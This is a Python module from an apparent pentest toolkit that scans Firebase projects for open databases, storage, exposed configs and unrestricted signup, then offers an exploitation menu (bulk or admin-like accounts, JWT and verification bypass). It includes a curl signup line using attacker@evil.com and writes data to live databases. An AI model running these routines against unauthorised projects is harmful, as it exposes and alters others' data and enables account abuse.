#!/usr/bin/env python3
# modules/Web/firebase_scanner.py

import requests
import json
import re
import sys
import os
import threading
import time
from urllib.parse import urlparse, urljoin
from pathlib import Path
from typing import List, Optional, Dict, Tuple
import subprocess

# Try different import methods
try:
    from core.base import ToolModule
    from core.colors import Colors
except ImportError:
    try:
        from modules.core.base import ToolModule
        from modules.core.colors import Colors
    except ImportError:
        # Create minimal fallback classes if imports fail
        class ToolModule:
            def __init__(self):
                pass
            def _get_name(self) -> str:
                return ""
            def _get_category(self) -> str:
                return ""
            def _get_command(self) -> str:
                return ""
            def _get_description(self) -> str:
                return ""
            def _get_dependencies(self) -> List[str]:
                return []
            def check_installation(self) -> bool:
                return True
            def run_guided(self) -> None:
                pass
            def run_direct(self) -> None:
                pass
            def get_help(self) -> dict:
                return {}
        
        class Colors:
            CYAN = '\033[96m'
            GREEN = '\033[92m'
            WARNING = '\033[93m'
            FAIL = '\033[91m'
            ENDC = '\033[0m'
            BOLD = '\033[1m'
            RED = '\033[31m'
            YELLOW = '\033[33m'

class FirebaseScannerModule(ToolModule):
    def __init__(self):
        super().__init__()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.vulnerabilities = []
        self.project_id = None
        self.api_key = None
        self.database_url = None
        
    def _get_name(self) -> str:
        return "Firebase Scanner"

    def _get_category(self) -> str:
        return "Web"

    def _get_command(self) -> str:
        return "firebase-scanner"

    def _get_description(self) -> str:
        return "Comprehensive Firebase security scanner for misconfigurations and vulnerabilities"

    def _get_dependencies(self) -> List[str]:
        return ["python3", "python3-requests"]

    def _get_script_path(self) -> str:
        return ""

    def get_help(self) -> dict:
        return {
            "title": "Firebase Scanner - Firebase Security Assessment",
            "usage": "use firebase-scanner",
            "desc": "Comprehensive security scanner for Firebase applications that checks for common misconfigurations, exposed databases, authentication bypasses, and other vulnerabilities.",
            "modes": {
                "Guided": "Interactive mode with step-by-step configuration",
                "Direct": "Direct command execution with custom parameters"
            },
            "features": {
                "Database Security": "Check for open Realtime Database and Firestore",
                "Authentication Bypass": "Test for weak authentication rules",
                "Storage Misconfiguration": "Scan Firebase Storage for exposed files",
                "API Key Exposure": "Validate API key restrictions",
                "Admin SDK": "Test for exposed admin endpoints",
                "Cloud Functions": "Enumerate and test cloud functions",
                "Hosting": "Check for source code exposure in hosting",
                "Exploitation": "Active exploitation of found vulnerabilities"
            },
            "examples": [
                'Scan project: my-firebase-project',
                'Full scan with API key: my-firebase-project --api-key AIzaSyBv...',
                'Database only: my-project --database-only',
                'Exploit vulnerabilities: exploit my-project AIza...'
            ],
            "notes": [
                "Requires either project ID or full Firebase URL",
                "API key helps with deeper scanning but not required",
                "Some tests may trigger Firebase security alerts",
                "Use responsibly and only on authorized targets"
            ]
        }

    def _show_banner(self):
        print(f'''
{Colors.CYAN}╔══════════════════════════════════════════╗
║           FIREBASE SCANNER               ║
║     "Firebase Security Assessment"       ║
║         Misconfiguration Hunter          ║
╚══════════════════════════════════════════╝{Colors.ENDC}

{Colors.YELLOW}⚠️  Use only on authorized Firebase projects ⚠️{Colors.ENDC}
''')

    def _extract_firebase_config(self, url_or_project: str) -> bool:
        """Extract Firebase configuration from URL or project ID"""
        try:
            if url_or_project.startswith('http'):
                # Try to extract from URL
                response = self.session.get(url_or_project, timeout=10)
                content = response.text
                
                # Look for Firebase config in the page
                config_patterns = [
                    r'firebase\.initializeApp\(\s*({[^}]+})',
                    r'var\s+firebaseConfig\s*=\s*({[^}]+})',
                    r'const\s+firebaseConfig\s*=\s*({[^}]+})',
                    r'"firebaseConfig":\s*({[^}]+})'
                ]
                
                for pattern in config_patterns:
                    match = re.search(pattern, content, re.IGNORECASE)
                    if match:
                        try:
                            # Clean up the JSON and parse it
                            json_str = match.group(1)
                            json_str = re.sub(r'(\w+):', r'"\1":', json_str)  # Add quotes to keys
                            json_str = re.sub(r"'", '"', json_str)  # Replace single quotes
                            
                            config = json.loads(json_str)
                            
                            self.project_id = config.get('projectId')
                            self.api_key = config.get('apiKey')
                            self.database_url = config.get('databaseURL')
                            
                            if self.project_id:
                                print(f"{Colors.GREEN}[✓] Firebase config extracted from URL{Colors.ENDC}")
                                print(f"    Project ID: {self.project_id}")
                                return True
                        except json.JSONDecodeError:
                            continue
                
                # If no config found, try to extract project ID from URL patterns
                url_patterns = [
                    r'https://([^.]+)\.firebaseapp\.com',
                    r'https://([^.]+)\.web\.app',
                    r'projectId["\s]*[:=]["\s]*([^"\'\\s,}]+)'
                ]
                
                for pattern in url_patterns:
                    match = re.search(pattern, url_or_project + content)
                    if match:
                        self.project_id = match.group(1)
                        print(f"{Colors.GREEN}[✓] Project ID extracted: {self.project_id}{Colors.ENDC}")
                        return True
                        
            else:
                # Treat as project ID
                self.project_id = url_or_project
                print(f"{Colors.GREEN}[✓] Using project ID: {self.project_id}{Colors.ENDC}")
                return True
                
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error extracting Firebase config: {e}{Colors.ENDC}")
            
        return False

    def _test_realtime_database(self) -> List[Dict]:
        """Test Firebase Realtime Database for security issues"""
        vulnerabilities = []
        
        if not self.project_id:
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing Realtime Database...{Colors.ENDC}")
        
        # Possible database URLs with correct regional patterns
        db_urls = [
            f"https://{self.project_id}-default-rtdb.firebaseio.com/",
            f"https://{self.project_id}-default-rtdb.europe-west1.firebasedatabase.app/",
            f"https://{self.project_id}-default-rtdb.asia-southeast1.firebasedatabase.app/",
            f"https://{self.project_id}-default-rtdb.us-central1.firebasedatabase.app/",
            f"https://{self.project_id}.firebaseio.com/",  # Legacy format
        ]
        
        if self.database_url:
            db_urls.insert(0, self.database_url.rstrip('/') + '/')
        
        for db_url in db_urls:
            try:
                print(f"{Colors.CYAN}[*] Testing database URL: {db_url}{Colors.ENDC}")
                
                # Test read access to root
                test_url = db_url + ".json"
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    content = response.text
                    
                    # Check if we actually got data (not just 'null')
                    if content and content.strip() != 'null' and len(content.strip()) > 2:
                        try:
                            data = json.loads(content)
                            data_size = len(str(data)) if data else 0
                            
                            severity = "CRITICAL" if data_size > 100 else "HIGH"
                            vulnerabilities.append({
                                'type': 'Open Realtime Database',
                                'severity': severity,
                                'url': db_url,
                                'description': f'Database allows unauthorized read access ({data_size} chars of data)',
                                'evidence': content[:300] + '...' if len(content) > 300 else content,
                                'impact': 'Complete database content exposure without authentication'
                            })
                            print(f"{Colors.FAIL}[!] {severity}: Open database found at {db_url}{Colors.ENDC}")
                            print(f"    Data size: {data_size} characters")
                            
                            # Test write access
                            test_data = {'scanner_test': {'timestamp': int(time.time()), 'test': True}}
                            write_url = f"{db_url}scanner_test.json"
                            
                            try:
                                write_resp = self.session.put(write_url, json=test_data['scanner_test'], timeout=5)
                                
                                if write_resp.status_code == 200:
                                    vulnerabilities.append({
                                        'type': 'Database Write Access',
                                        'severity': 'CRITICAL',
                                        'url': write_url,
                                        'description': 'Database allows unauthorized write access',
                                        'evidence': f'Successfully wrote test data',
                                        'impact': 'Data can be modified or deleted without authentication'
                                    })
                                    print(f"{Colors.FAIL}[!] CRITICAL: Write access confirmed!{Colors.ENDC}")
                                    
                                    # Clean up test data
                                    try:
                                        self.session.delete(write_url, timeout=3)
                                    except:
                                        pass
                                        
                            except requests.exceptions.RequestException:
                                pass
                            
                            # Test specific sensitive paths if we found data
                            if isinstance(data, dict):
                                sensitive_paths = ['users', 'user', 'admin', 'config', 'settings', 'private', 'secret']
                                existing_paths = [path for path in sensitive_paths if path in data]
                                
                                for path in existing_paths:
                                    path_url = f"{db_url}{path}.json"
                                    try:
                                        path_resp = self.session.get(path_url, timeout=5)
                                        if path_resp.status_code == 200 and path_resp.text != 'null':
                                            path_data = path_resp.text
                                            vulnerabilities.append({
                                                'type': 'Sensitive Data Exposure',
                                                'severity': 'CRITICAL',
                                                'url': path_url,
                                                'description': f'Sensitive path "{path}" accessible without auth',
                                                'evidence': path_data[:200] + '...' if len(path_data) > 200 else path_data,
                                                'impact': 'Sensitive user data or configuration exposed'
                                            })
                                            print(f"{Colors.FAIL}[!] CRITICAL: Sensitive path '{path}' exposed{Colors.ENDC}")
                                    except:
                                        continue
                            
                            break  # Found working database URL, no need to test others
                            
                        except json.JSONDecodeError:
                            # Got response but not valid JSON
                            if len(content.strip()) > 10:  # Some meaningful content
                                vulnerabilities.append({
                                    'type': 'Database Content Exposure',
                                    'severity': 'HIGH',
                                    'url': db_url,
                                    'description': 'Database returns content but not valid JSON',
                                    'evidence': content[:200] + '...' if len(content) > 200 else content,
                                    'impact': 'Database misconfiguration or data corruption'
                                })
                                print(f"{Colors.WARNING}[!] HIGH: Non-JSON content returned from database{Colors.ENDC}")
                    else:
                        print(f"{Colors.GREEN}[✓] Database exists but appears empty or properly secured{Colors.ENDC}")
                        
                elif response.status_code == 401:
                    print(f"{Colors.GREEN}[✓] Database properly secured with authentication at {db_url}{Colors.ENDC}")
                    break  # Found database but it's secured
                    
                elif response.status_code == 404:
                    print(f"{Colors.CYAN}[*] Database not found at {db_url}{Colors.ENDC}")
                    
                else:
                    print(f"{Colors.WARNING}[!] Unexpected response {response.status_code} from {db_url}{Colors.ENDC}")
                    
            except requests.exceptions.RequestException as e:
                print(f"{Colors.WARNING}[!] Could not connect to {db_url}: {str(e)[:50]}...{Colors.ENDC}")
                continue
                
        return vulnerabilities

    def _test_firestore(self) -> List[Dict]:
        """Test Firestore for security issues"""
        vulnerabilities = []
        
        if not self.project_id:
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing Firestore...{Colors.ENDC}")
        
        # Firestore REST API endpoint
        base_url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents"
        
        try:
            # Test without authentication
            response = self.session.get(base_url, timeout=10)
            
            if response.status_code == 200:
                vulnerabilities.append({
                    'type': 'Open Firestore Database',
                    'severity': 'CRITICAL',
                    'url': base_url,
                    'description': 'Firestore allows unauthorized access',
                    'evidence': response.text[:500] + '...' if len(response.text) > 500 else response.text,
                    'impact': 'Complete database access without authentication'
                })
                print(f"{Colors.FAIL}[!] CRITICAL: Open Firestore found!{Colors.ENDC}")
                
                # Test common collections
                collections = ['users', 'user', 'admin', 'settings', 'config', 'private']
                for collection in collections:
                    coll_url = f"{base_url}/{collection}"
                    coll_resp = self.session.get(coll_url, timeout=5)
                    if coll_resp.status_code == 200:
                        vulnerabilities.append({
                            'type': 'Exposed Firestore Collection',
                            'severity': 'HIGH',
                            'url': coll_url,
                            'description': f'Collection "{collection}" is accessible',
                            'evidence': coll_resp.text[:300] + '...' if len(coll_resp.text) > 300 else coll_resp.text,
                            'impact': 'Sensitive data exposure'
                        })
                        
            elif response.status_code == 403:
                print(f"{Colors.GREEN}[✓] Firestore properly secured{Colors.ENDC}")
                
        except requests.exceptions.RequestException as e:
            print(f"{Colors.WARNING}[!] Could not test Firestore: {e}{Colors.ENDC}")
            
        return vulnerabilities

    def _test_storage(self) -> List[Dict]:
        """Test Firebase Storage for security issues"""
        vulnerabilities = []
        
        if not self.project_id:
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing Firebase Storage...{Colors.ENDC}")
        
        # Storage URLs to test
        storage_urls = [
            f"https://firebasestorage.googleapis.com/v0/b/{self.project_id}.appspot.com/o",
            f"https://storage.googleapis.com/{self.project_id}.appspot.com"
        ]
        
        for storage_url in storage_urls:
            try:
                response = self.session.get(storage_url, timeout=10)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'items' in data and data['items']:
                            vulnerabilities.append({
                                'type': 'Open Firebase Storage',
                                'severity': 'HIGH',
                                'url': storage_url,
                                'description': 'Storage bucket allows unauthorized listing',
                                'evidence': f"Found {len(data['items'])} accessible files",
                                'impact': 'File enumeration and potential data exposure'
                            })
                            print(f"{Colors.FAIL}[!] HIGH: Open storage found with {len(data['items'])} files{Colors.ENDC}")
                            
                            # Check for sensitive files
                            sensitive_patterns = [
                                r'.*\.key$', r'.*\.pem$', r'.*\.p12$', r'.*\.json$',
                                r'.*config.*', r'.*secret.*', r'.*private.*',
                                r'.*backup.*', r'.*dump.*', r'.*\.sql$'
                            ]
                            
                            for item in data['items'][:20]:  # Check first 20 files
                                file_name = item.get('name', '')
                                for pattern in sensitive_patterns:
                                    if re.match(pattern, file_name, re.IGNORECASE):
                                        vulnerabilities.append({
                                            'type': 'Sensitive File Exposure',
                                            'severity': 'CRITICAL',
                                            'url': f"{storage_url}/{file_name}",
                                            'description': f'Potentially sensitive file: {file_name}',
                                            'evidence': f'File pattern matches: {pattern}',
                                            'impact': 'Potential credentials or configuration exposure'
                                        })
                                        break
                                        
                    except json.JSONDecodeError:
                        pass
                        
                elif response.status_code == 403:
                    print(f"{Colors.GREEN}[✓] Storage properly secured{Colors.ENDC}")
                    
            except requests.exceptions.RequestException:
                continue
                
        return vulnerabilities

    def _test_authentication(self) -> List[Dict]:
        """Test Firebase Authentication for weaknesses"""
        vulnerabilities = []
        
        if not self.project_id:
            print(f"{Colors.WARNING}[!] Project ID needed for auth testing{Colors.ENDC}")
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing Firebase Authentication...{Colors.ENDC}")
        
        # Test REST API endpoints with actual user creation attempts
        if self.api_key:
            # Test user registration with a real attempt
            signup_endpoints = [
                f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={self.api_key}",
                f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/signupNewUser?key={self.api_key}"
            ]
            
            test_email = f"pentester{int(time.time())}@example.com"
            test_password = "TestPassword123!"
            
            for endpoint in signup_endpoints:
                try:
                    print(f"{Colors.CYAN}[*] Testing signup at: {endpoint.split('/')[-1]}{Colors.ENDC}")
                    
                    # Prepare test data based on endpoint version
                    if "v1/accounts" in endpoint:
                        test_data = {
                            "email": test_email,
                            "password": test_password,
                            "returnSecureToken": True
                        }
                    else:  # v3 endpoint
                        test_data = {
                            "email": test_email,
                            "password": test_password,
                            "returnSecureToken": True
                        }
                    
                    response = self.session.post(endpoint, json=test_data, timeout=10)
                    
                    if response.status_code == 200:
                        # Successfully created user - this IS a vulnerability
                        try:
                            resp_data = response.json()
                            user_id = resp_data.get('localId', 'unknown')
                            id_token = resp_data.get('idToken', '')
                            
                            vulnerabilities.append({
                                'type': 'Unrestricted User Registration',
                                'severity': 'HIGH',
                                'url': endpoint,
                                'description': f'Successfully created user account without restrictions',
                                'evidence': f'Created user ID: {user_id}, got auth token',
                                'impact': 'Attackers can create unlimited accounts, potential for abuse, spam, or resource exhaustion',
                                'exploitation': f'curl -X POST "{endpoint}" -H "Content-Type: application/json" -d \'{{"email":"attacker@evil.com","password":"password123","returnSecureToken":true}}\''
                            })
                            print(f"{Colors.FAIL}[!] HIGH: Successfully created test user {test_email}{Colors.ENDC}")
                            
                            # Test if we can get user info with the token
                            if id_token:
                                profile_endpoints = [
                                    f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={self.api_key}",
                                    f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key={self.api_key}"
                                ]
                                
                                for profile_endpoint in profile_endpoints:
                                    try:
                                        profile_data = {"idToken": id_token}
                                        profile_resp = self.session.post(profile_endpoint, json=profile_data, timeout=5)
                                        
                                        if profile_resp.status_code == 200:
                                            profile_info = profile_resp.json()
                                            vulnerabilities.append({
                                                'type': 'User Profile Information Disclosure',
                                                'severity': 'MEDIUM',
                                                'url': profile_endpoint,
                                                'description': 'Created user profile is accessible',
                                                'evidence': f'Retrieved profile data: {str(profile_info)[:200]}...',
                                                'impact': 'User profile information can be accessed after account creation'
                                            })
                                            print(f"{Colors.WARNING}[!] Can access user profile after creation{Colors.ENDC}")
                                            break
                                    except:
                                        continue
                            
                            # Try to delete the test user (cleanup)
                            try:
                                delete_endpoints = [
                                    f"https://identitytoolkit.googleapis.com/v1/accounts:delete?key={self.api_key}",
                                    f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/deleteAccount?key={self.api_key}"
                                ]
                                
                                for delete_endpoint in delete_endpoints:
                                    delete_data = {"idToken": id_token} if id_token else {"localId": user_id}
                                    delete_resp = self.session.post(delete_endpoint, json=delete_data, timeout=5)
                                    if delete_resp.status_code == 200:
                                        print(f"{Colors.GREEN}[✓] Cleaned up test user{Colors.ENDC}")
                                        break
                            except:
                                print(f"{Colors.WARNING}[!] Could not cleanup test user {test_email}{Colors.ENDC}")
                            
                        except json.JSONDecodeError:
                            # Got 200 but invalid JSON - still might be vulnerable
                            vulnerabilities.append({
                                'type': 'Authentication Endpoint Accessible',
                                'severity': 'MEDIUM',
                                'url': endpoint,
                                'description': 'Signup endpoint returns HTTP 200 but invalid response',
                                'evidence': f'Response: {response.text[:200]}...',
                                'impact': 'Authentication system may be misconfigured'
                            })
                            
                    elif response.status_code == 400:
                        # Check the error message to understand why it failed
                        try:
                            error_data = response.json()
                            error_message = error_data.get('error', {}).get('message', '')
                            
                            if 'EMAIL_EXISTS' in error_message:
                                print(f"{Colors.GREEN}[✓] Signup works but email validation prevents duplicate{Colors.ENDC}")
                            elif 'OPERATION_NOT_ALLOWED' in error_message:
                                print(f"{Colors.GREEN}[✓] User registration is properly disabled{Colors.ENDC}")
                            elif 'WEAK_PASSWORD' in error_message:
                                # This means registration is enabled but has password requirements
                                vulnerabilities.append({
                                    'type': 'Registration Enabled with Weak Controls',
                                    'severity': 'MEDIUM',
                                    'url': endpoint,
                                    'description': 'User registration is enabled but rejected due to weak password policy',
                                    'evidence': f'Error: {error_message}',
                                    'impact': 'Registration is possible with stronger passwords'
                                })
                                print(f"{Colors.WARNING}[!] MEDIUM: Registration enabled, strengthen password and retry{Colors.ENDC}")
                            elif 'INVALID_EMAIL' in error_message:
                                print(f"{Colors.GREEN}[✓] Email validation working properly{Colors.ENDC}")
                            else:
                                print(f"{Colors.WARNING}[!] Unexpected auth error: {error_message}{Colors.ENDC}")
                                
                        except json.JSONDecodeError:
                            print(f"{Colors.WARNING}[!] Auth endpoint returned 400 with non-JSON response{Colors.ENDC}")
                            
                    elif response.status_code == 403:
                        print(f"{Colors.GREEN}[✓] User registration properly restricted{Colors.ENDC}")
                        
                    elif response.status_code == 404:
                        print(f"{Colors.CYAN}[*] Auth endpoint not found: {endpoint.split('/')[-1]}{Colors.ENDC}")
                        
                    else:
                        print(f"{Colors.WARNING}[!] Unexpected response {response.status_code} from auth endpoint{Colors.ENDC}")
                        
                except requests.exceptions.RequestException as e:
                    print(f"{Colors.WARNING}[!] Could not test auth endpoint: {e}{Colors.ENDC}")
        
        # Test for exposed authentication configuration
        config_urls = [
            f"https://{self.project_id}.firebaseapp.com/__/firebase/init.json",
            f"https://{self.project_id}.web.app/__/firebase/init.json",
            f"https://{self.project_id}.firebaseapp.com/firebase-config.js",
            f"https://{self.project_id}.firebaseapp.com/__/firebase/config.json"
        ]
        
        for config_url in config_urls:
            try:
                response = self.session.get(config_url, timeout=5)
                
                if response.status_code == 200:
                    content = response.text
                    
                    # Check if it contains sensitive configuration
                    sensitive_indicators = [
                        'apiKey', 'authDomain', 'databaseURL', 'projectId',
                        'storageBucket', 'messagingSenderId', 'appId'
                    ]
                    
                    if any(indicator in content for indicator in sensitive_indicators):
                        try:
                            config_data = response.json()
                            vulnerabilities.append({
                                'type': 'Firebase Configuration Exposure',
                                'severity': 'LOW',
                                'url': config_url,
                                'description': 'Firebase configuration publicly accessible',
                                'evidence': f'Config keys: {list(config_data.keys()) if isinstance(config_data, dict) else "Invalid JSON"}',
                                'impact': 'API keys and project configuration exposed (normal for client-side apps but should be noted)'
                            })
                            print(f"{Colors.YELLOW}[!] LOW: Firebase config exposed (normal for web apps){Colors.ENDC}")
                        except json.JSONDecodeError:
                            if len(content) > 50:  # Substantial content
                                vulnerabilities.append({
                                    'type': 'Configuration File Exposure',
                                    'severity': 'MEDIUM',
                                    'url': config_url,
                                    'description': 'Configuration file accessible but contains non-JSON data',
                                    'evidence': content[:200] + '...' if len(content) > 200 else content,
                                    'impact': 'Potential configuration or sensitive data exposure'
                                })
                                
            except requests.exceptions.RequestException:
                continue
            
        return vulnerabilities

    def _test_cloud_functions(self) -> List[Dict]:
        """Test for exposed Cloud Functions"""
        vulnerabilities = []
        
        if not self.project_id:
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing Cloud Functions...{Colors.ENDC}")
        
        # Common function names to test
        function_names = [
            'api', 'webhook', 'admin', 'test', 'debug', 'dev',
            'upload', 'download', 'process', 'sync', 'backup',
            'user', 'auth', 'login', 'register', 'verify'
        ]
        
        # Possible regions
        regions = ['us-central1', 'europe-west1', 'asia-east1']
        
        for region in regions:
            for func_name in function_names:
                func_url = f"https://{region}-{self.project_id}.cloudfunctions.net/{func_name}"
                
                try:
                    response = self.session.get(func_url, timeout=5)
                    
                    if response.status_code == 200:
                        vulnerabilities.append({
                            'type': 'Exposed Cloud Function',
                            'severity': 'MEDIUM',
                            'url': func_url,
                            'description': f'Cloud function "{func_name}" is accessible',
                            'evidence': response.text[:200] + '...' if len(response.text) > 200 else response.text,
                            'impact': 'Potential unauthorized function execution'
                        })
                        print(f"{Colors.WARNING}[!] Found function: {func_name}{Colors.ENDC}")
                        
                    elif response.status_code == 403:
                        print(f"{Colors.GREEN}[✓] Function {func_name} properly secured{Colors.ENDC}")
                        
                except requests.exceptions.RequestException:
                    continue
                    
        return vulnerabilities

    def _test_api_keys(self) -> List[Dict]:
        """Test API key restrictions and validity"""
        vulnerabilities = []
        
        if not self.api_key:
            print(f"{Colors.WARNING}[!] No API key to test{Colors.ENDC}")
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing API Key Security...{Colors.ENDC}")
        
        # First, test if the API key is actually valid and functional
        test_url = f"https://firebase.googleapis.com/v1beta1/projects/{self.project_id}"
        
        try:
            response = self.session.get(f"{test_url}?key={self.api_key}", timeout=10)
            
            if response.status_code == 403:
                error_data = response.json() if response.content else {}
                error_message = error_data.get('error', {}).get('message', '')
                
                if 'API key not valid' in error_message:
                    print(f"{Colors.FAIL}[!] API key is invalid or expired{Colors.ENDC}")
                    return vulnerabilities
                elif 'restricted' in error_message.lower():
                    print(f"{Colors.GREEN}[✓] API key has proper restrictions{Colors.ENDC}")
                else:
                    print(f"{Colors.WARNING}[!] API key restriction unclear: {error_message}{Colors.ENDC}")
                    
            elif response.status_code == 200:
                vulnerabilities.append({
                    'type': 'Overprivileged API Key',
                    'severity': 'HIGH',
                    'url': test_url,
                    'description': 'API key has access to project management APIs',
                    'evidence': f'HTTP 200 response to project details endpoint',
                    'impact': 'API key may have excessive permissions'
                })
                print(f"{Colors.FAIL}[!] HIGH: API key has project-level access{Colors.ENDC}")
                
        except requests.exceptions.RequestException as e:
            print(f"{Colors.WARNING}[!] Could not test API key validity: {e}{Colors.ENDC}")
        
        # Test API key with different HTTP referrers (more realistic test)
        print(f"{Colors.CYAN}[*] Testing referrer restrictions...{Colors.ENDC}")
        
        # Use Firebase's actual config endpoint which is more likely to respect referrer restrictions
        config_test_url = f"https://{self.project_id}.firebaseapp.com/__/firebase/init.json?key={self.api_key}"
        
        test_referrers = [
            'https://malicious-site.com',
            'https://evil.com', 
            'http://localhost:3000',
            'https://attacker.firebaseapp.com'
        ]
        
        baseline_response = None
        try:
            # Get baseline response without referrer
            baseline_response = self.session.get(config_test_url, timeout=5)
        except:
            pass
        
        restriction_bypassed = False
        
        for referrer in test_referrers:
            headers = {
                'Referer': referrer,
                'Origin': referrer
            }
            
            try:
                response = self.session.get(config_test_url, headers=headers, timeout=5)
                
                # If we get same response as baseline, restrictions might be bypassed
                if (baseline_response and 
                    response.status_code == baseline_response.status_code and 
                    response.status_code == 200):
                    
                    restriction_bypassed = True
                    print(f"{Colors.WARNING}[!] API key works with referrer: {referrer}{Colors.ENDC}")
                    
            except requests.exceptions.RequestException:
                continue
        
        if restriction_bypassed:
            vulnerabilities.append({
                'type': 'Weak API Key Restrictions',
                'severity': 'MEDIUM',
                'url': config_test_url,
                'description': 'API key lacks proper referrer restrictions',
                'evidence': f'API key accessible from unauthorized referrers',
                'impact': 'API key could be abused from malicious websites'
            })
        else:
            print(f"{Colors.GREEN}[✓] API key appears to have proper referrer restrictions{Colors.ENDC}")
        
        # Test for exposed service account keys (different from web API keys)
        service_account_patterns = [
            f"https://{self.project_id}.firebaseapp.com/service-account-key.json",
            f"https://{self.project_id}.web.app/service-account-key.json",
            f"https://{self.project_id}.firebaseapp.com/firebase-adminsdk.json",
            f"https://{self.project_id}.firebaseapp.com/.env",
        ]
        
        for sa_url in service_account_patterns:
            try:
                sa_response = self.session.get(sa_url, timeout=5)
                if sa_response.status_code == 200:
                    content = sa_response.text
                    if ('private_key' in content or 
                        'service_account' in content.lower() or
                        'firebase_admin' in content.lower()):
                        
                        vulnerabilities.append({
                            'type': 'Exposed Service Account Key',
                            'severity': 'CRITICAL',
                            'url': sa_url,
                            'description': 'Service account credentials publicly accessible',
                            'evidence': 'Found private_key or service account indicators',
                            'impact': 'Complete Firebase project compromise possible'
                        })
                        print(f"{Colors.FAIL}[!] CRITICAL: Service account key exposed at {sa_url}{Colors.ENDC}")
                        
            except requests.exceptions.RequestException:
                continue
                
        return vulnerabilities

    def _test_hosting(self) -> List[Dict]:
        """Test Firebase Hosting for issues"""
        vulnerabilities = []
        
        if not self.project_id:
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing Firebase Hosting...{Colors.ENDC}")
        
        # Hosting URLs
        hosting_urls = [
            f"https://{self.project_id}.web.app",
            f"https://{self.project_id}.firebaseapp.com"
        ]
        
        for base_url in hosting_urls:
            try:
                response = self.session.get(base_url, timeout=10)
                
                if response.status_code == 200:
                    content = response.text
                    
                    # Check for exposed source maps
                    if '.map' in content:
                        map_urls = re.findall(r'sourceMappingURL=([^\s]+\.map)', content)
                        for map_url in map_urls:
                            full_map_url = urljoin(base_url, map_url)
                            map_resp = self.session.get(full_map_url, timeout=5)
                            if map_resp.status_code == 200:
                                vulnerabilities.append({
                                    'type': 'Source Map Exposure',
                                    'severity': 'MEDIUM',
                                    'url': full_map_url,
                                    'description': 'Source maps are publicly accessible',
                                    'evidence': f'Source map found: {map_url}',
                                    'impact': 'Source code structure exposure'
                                })
                    
                    # Check for exposed config files
                    config_files = [
                        '/.env', '/config.json', '/firebase.json', '/.firebaserc',
                        '/admin-config.json', '/service-account.json'
                    ]
                    
                    for config_file in config_files:
                        config_url = base_url + config_file
                        config_resp = self.session.get(config_url, timeout=5)
                        if config_resp.status_code == 200:
                            vulnerabilities.append({
                                'type': 'Configuration File Exposure',
                                'severity': 'HIGH',
                                'url': config_url,
                                'description': f'Configuration file exposed: {config_file}',
                                'evidence': config_resp.text[:200] + '...' if len(config_resp.text) > 200 else config_resp.text,
                                'impact': 'Potential credentials or sensitive configuration exposure'
                            })
                            
            except requests.exceptions.RequestException:
                continue
                
        return vulnerabilities

    # Update the main exploitation menu to include JWT testing
    def _exploit_user_registration(self, endpoint: str, api_key: str) -> None:
        """Interactive exploitation of user registration vulnerability"""
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║           EXPLOITATION MODULE            ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        print(f"\n{Colors.YELLOW}[*] Exploiting User Registration at:{Colors.ENDC}")
        print(f"    {endpoint}")
        
        while True:
            print(f"\n{Colors.CYAN}[*] Exploitation Options:{Colors.ENDC}")
            print("1. Create single user account")
            print("2. Create multiple user accounts (bulk)")
            print("3. Create admin-like account")
            print("4. Extract user information (Enhanced)")
            print("5. Test privilege escalation")
            print("6. Test email verification bypass (Basic)")
            print("7. Test JWT manipulation bypass (Advanced)")
            print("8. Generate exploitation script")
            print("9. Back to main menu")
            
            choice = input(f"\n{Colors.BOLD}[+] Select option (1-9): {Colors.ENDC}").strip()
            
            if choice == "1":
                self._create_single_user(endpoint, api_key)
            elif choice == "2":
                self._create_bulk_users(endpoint, api_key)
            elif choice == "3":
                self._create_admin_user(endpoint, api_key)
            elif choice == "4":
                self._extract_user_info(api_key)
            elif choice == "5":
                self._test_privilege_escalation(api_key)
            elif choice == "6":
                self._test_email_verification_bypass(api_key)
            elif choice == "7":
                self._test_jwt_manipulation_bypass(api_key)
            elif choice == "8":
                self._generate_exploit_script(endpoint, api_key)
            elif choice == "9":
                break
            else:
                print(f"{Colors.FAIL}[!] Invalid option{Colors.ENDC}")

    def _create_single_user(self, endpoint: str, api_key: str) -> None:
        """Create a single user account"""
        print(f"\n{Colors.CYAN}[*] Creating Single User Account{Colors.ENDC}")
        
        email = input(f"{Colors.BOLD}[+] Enter email (or press Enter for random): {Colors.ENDC}").strip()
        if not email:
            email = f"hacker{int(time.time())}@evil.com"
            
        password = input(f"{Colors.BOLD}[+] Enter password (default: HackerPass123!): {Colors.ENDC}").strip()
        if not password:
            password = "HackerPass123!"
        
        display_name = input(f"{Colors.BOLD}[+] Enter display name (optional): {Colors.ENDC}").strip()
        
        # Determine data format based on endpoint
        if "v1/accounts" in endpoint:
            user_data = {
                "email": email,
                "password": password,
                "returnSecureToken": True
            }
            if display_name:
                user_data["displayName"] = display_name
        else:  # v3 endpoint
            user_data = {
                "email": email,
                "password": password,
                "returnSecureToken": True
            }
            if display_name:
                user_data["displayName"] = display_name
        
        try:
            print(f"{Colors.CYAN}[*] Creating user: {email}{Colors.ENDC}")
            response = self.session.post(endpoint, json=user_data, timeout=10)
            
            if response.status_code == 200:
                user_info = response.json()
                user_id = user_info.get('localId', 'Unknown')
                id_token = user_info.get('idToken', '')
